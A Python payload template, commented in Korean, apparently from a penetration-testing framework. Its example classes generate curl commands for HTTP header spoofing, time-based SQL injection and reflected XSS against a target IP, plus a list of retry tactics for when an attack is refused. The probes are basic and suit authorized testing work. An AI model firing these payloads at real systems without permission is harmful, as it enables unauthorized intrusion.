"""
Payload Template — 새로운 payload 작성 시 이 템플릿을 사용하세요
"""


class Payload:
    """
    커스텀 공격 payload 템플릿

    사용법:
    1. 이 파일을 복사 (예: web_rce.py)
    2. generate() 메서드 구현
    3. attacks.yaml에서 참조
    """

    def __init__(self, target: str, **kwargs):
        """
        Args:
            target: 공격 대상 (IP/도메인)
            **kwargs: 추가 파라미터 (포트, 경로 등)
        """
        self.target = target
        self.kwargs = kwargs

    def generate(self) -> str:
        """
        공격 payload 생성

        Returns:
            실행할 쉘 명령 (문자열)
        """
        # 예시: HTTP GET 요청
        # payload = f"curl -i http://{self.target}/admin"
        # return payload

        raise NotImplementedError("generate() 메서드를 구현하세요")

    def validate(self) -> bool:
        """payload 검증 (선택사항)"""
        return True

    @staticmethod
    def suggest_alternatives():
        """이 공격이 거절되었을 때 제시할 대안들"""
        return [
            "다른 경로 시도",
            "다른 메서드 (POST 대신 GET) 시도",
            "타임아웃 증가",
        ]


# 예시 1: HTTP Header Injection
class HTTPHeaderInjection(Payload):
    def generate(self) -> str:
        """HTTP 헤더 주입"""
        return f"curl -H 'X-Forwarded-For: 127.0.0.1' http://{self.target}/"


# 예시 2: SQL Injection (time-based)
class SQLInjectionTimeBased(Payload):
    def generate(self) -> str:
        """Time-based SQL injection"""
        payload = "1' AND SLEEP(5) -- -"
        encoded = payload.replace(" ", "%20").replace("'", "%27")
        return f"curl 'http://{self.target}/search?q={encoded}'"


# 예시 3: XSS (Reflected)
class XSSReflected(Payload):
    def generate(self) -> str:
        """Reflected XSS"""
        payload = "<script>alert(1)</script>"
        encoded = payload.replace("<", "%3C").replace(">", "%3E")
        return f"curl 'http://{self.target}/search?q={encoded}'"


if __name__ == "__main__":
    # 테스트
    target = "192.168.1.100"

    header_inj = HTTPHeaderInjection(target)
    print("HTTP Header Injection:")
    print(header_inj.generate())

    sqli = SQLInjectionTimeBased(target)
    print("\nSQL Injection (Time-based):")
    print(sqli.generate())

    xss = XSSReflected(target)
    print("\nXSS (Reflected):")
    print(xss.generate())
